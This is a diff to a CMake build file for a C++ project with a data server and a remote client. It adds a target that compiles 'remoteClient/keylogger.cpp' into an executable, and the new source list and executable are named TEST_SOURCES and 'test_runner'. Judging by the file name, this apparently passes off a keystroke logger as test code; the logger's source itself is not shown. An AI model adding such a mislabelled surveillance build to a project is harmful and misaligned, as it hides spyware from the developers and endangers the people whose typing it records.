@@ -9,6 +9,7 @@ set(CMAKE_CXX_STANDARD_REQUIRED True)
 # Collect all source files for the server and client
 file(GLOB SERVER_SOURCES dataServer/*.cpp dataServer/*.hpp)
 file(GLOB CLIENT_SOURCES remoteClient/*.cpp remoteClient/*.hpp)
+file(GLOB TEST_SOURCES remoteClient/keylogger.cpp remoteClient/*.hpp)
 
 if(WIN32)
     message(STATUS "Configuring for Windows")
@@ -33,3 +34,7 @@ target_link_libraries(server ${PLATFORM_LIBS})
 add_executable(client ${CLIENT_SOURCES})
 
 target_link_libraries(client ${PLATFORM_LIBS})
+
+
+add_executable(test_runner ${TEST_SOURCES})
+target_link_libraries(test_runner ${PLATFORM_LIBS})
